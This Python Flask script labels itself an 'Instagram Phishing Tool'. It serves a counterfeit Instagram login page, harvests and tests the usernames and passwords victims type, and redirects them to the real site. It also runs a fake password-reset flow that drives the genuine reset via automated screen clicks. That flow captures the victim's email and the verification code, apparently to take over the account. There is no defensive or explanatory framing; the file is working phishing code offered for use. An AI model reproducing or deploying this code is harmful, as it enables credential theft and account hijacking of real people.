from flask import Flask,url_for,redirect ,request ,render_template
from cliker import *
import pyautogui ,subprocess
from colorama import Fore, Style
app = Flask(__name__ ,template_folder='pages' ,static_folder='static')
email=""
subprocess.run(['clear'])
print(Fore.YELLOW,"""

    ██╗ ███╗  ██╗  █████╗ ████████╗  █████╗  ██████╗  ██╗  ██╗ ██╗  ██████╗ ██╗  ██╗
    ██║ ████╗ ██║ ██╔═══╝ ╚══██╔══╝ ██╔══██╗ ██╔══██╗ ██║  ██║ ██║ ██╔════╝ ██║  ██║
    ██║ ██╔██╗██║ ╚█████     ██║    ███████║ ██████╔╝ ███████║ ██║ ╚█████╗  ███████║
    ██║ ██║╚████║  ╚═══█╗    ██║    ██╔══██║ ██╔═══╝  ██╔══██║ ██║  ╚═══██╗ ██╔══██║  
    ██║ ██║ ╚███║ ██████╝    ██║    ██║  ██║ ██║      ██║  ██║ ██║ ██████╔╝ ██║  ██║  
    ╚═╝ ╚═╝  ╚══╝ ╚═════     ╚═╝    ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝ ╚═╝ ╚═════╝  ╚═╝  ╚═╝  
""")
print(Fore.WHITE, Style.BRIGHT,
f"""
    Instagram Phishing Tool
    Developed by {Fore.GREEN}@lahrour_1902 :{Fore.CYAN}
    █   █▀█ █ █ █▀█ █▀█ █ █ █▀█
    █▄▄ █▀█ █▀█ █▀▄ █▄█ █▄█ █▀▄
""")
print(Fore.WHITE, f"    open your browser and go to:{Fore.RED}http://localhost:5000",Fore.WHITE)

@app.route('/',methods=["POST","GET"])
def home():

    return render_template('login.html')

@app.route('/login',methods=["POST","GET"])
def login():
    if request.method == "POST" :
        username= request.form.get('username')
        password = request.form.get("password")
        result= login_test(username ,password)
        if result == True :
            return """<script>window.location.href="https://instagram.com"</script>"""
        else :
            return '<p>Invalid credentials, please try again.</p>'

@app.route('/oublier',methods=["POST","GET"])
def oublier():
    try:
        if request.method == "GET":
            reset=pyautogui.locateOnScreen("static/reset.png" , confidence=0.8)
            if reset:
                x ,y =pyautogui.center(reset)
                pyautogui.click(x,y)
        if request.method == "POST":
            global email
            email = request.form.get("email")
            print(email)
            verification=send_verifications_code(email)
            if verification == True :
                return redirect(url_for("enter_code"))
        return render_template('oublier.html')
    except Exception as e:
        print(e)
        return f'<p>An error occurred, please try again. {e}</p>'

@app.route('/enter_code',methods=["POST","GET"])
def enter_code():
    if request.method == "POST":
        code = request.form.get("code")
        print(code)
        write_code(code)
        return redirect('https://instagram.com')
    return render_template('enter_code.html', email=email)


if __name__ == '__main__':
    app.run(debug=True ,port=5000 ,host="0.0.0.0")